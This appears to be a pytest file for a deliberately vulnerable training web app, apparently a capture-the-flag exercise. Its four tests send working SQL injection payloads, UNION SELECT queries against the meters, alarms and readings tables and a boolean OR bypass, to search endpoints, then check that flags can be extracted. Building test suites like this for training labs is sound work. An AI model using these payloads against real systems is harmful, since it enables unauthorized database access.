# SQLi flags are now shown via a banner in the response (sentinel
# detection server-side), not embedded directly in the exfiltrated row
# data -- see app/flags.py's module docstring.


def test_sqli_teach_admin_meters(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT id,meter_code,user_id,nickname,status,balance,created_at,0,0,0 FROM meters--"
    resp = ops1_admin.get(f"{base_url}/admin/meters", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_sqli_exercise_admin_alarms(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT id,meter_id,type,message,created_at,0 FROM alarms--"
    resp = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_sqli_bonus_usage(alice, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT reading_kwh, source, recorded_at FROM readings--"
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sqli_boolean_bonus_usage(alice, base_url, extract_flag_fn, redeem_flag_fn):
    # No UNION keyword -- a classic boolean OR bypass instead, the
    # easier first technique before the UNION-based one above. The
    # trailing `-- ` comments out the template's own closing `%'`, which
    # this exact query shape needs to make '1'='1' actually take effect
    # rather than being neutralized by AND/OR precedence.
    payload = "' OR '1'='1' -- "
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)

